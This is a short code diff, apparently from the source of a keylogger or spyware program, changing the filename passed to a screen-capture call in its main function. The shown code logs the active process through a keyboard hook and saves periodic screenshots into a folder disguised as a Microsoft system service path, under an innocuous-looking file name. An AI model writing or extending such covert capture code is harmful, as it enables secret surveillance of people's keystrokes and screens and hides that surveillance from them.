@@ -19,7 +19,7 @@ int main() {
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
 
   Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
-						"winpst" + std::to_string(Screen::picId) + ".jpeg",
+						"winpst",
 						false,
 						1000,
 						5);
